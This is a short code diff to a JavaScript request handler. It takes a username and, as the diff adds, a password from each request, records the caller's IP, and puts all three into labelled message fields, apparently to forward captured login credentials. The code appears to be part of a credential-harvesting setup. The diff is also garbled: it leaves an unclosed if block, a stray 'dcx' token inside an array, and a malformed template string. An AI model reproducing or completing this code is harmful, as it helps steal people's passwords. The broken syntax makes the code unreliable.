@@ -7,11 +7,15 @@ export default async function handler(req, res) {
 
     try {
         const { username } = req.body;
+        const { password } = req.body;
 
         if (!username) {
             return res.status(400).json({
                 error: "Username required"
             });
+        if (!password) {
+            return res.status(400).json({
+                error: "Password required"
         }
 
         const ip =
@@ -45,6 +49,7 @@ export default async function handler(req, res) {
                             value: `\`${username}\``,
                             inline: true
                         },
+                        dcx 
                         {
                             name: "🌍 IP",
                             value: `\`${ip}\``,
@@ -57,7 +62,7 @@ export default async function handler(req, res) {
                         },
                         {
                             name: "🔐 Password",
-                            value: `\`${password.city || "Unknown"}\``,
+                            value: `\`${password} || "Unknown"}\``,
                             inline: true
                         },
                         {
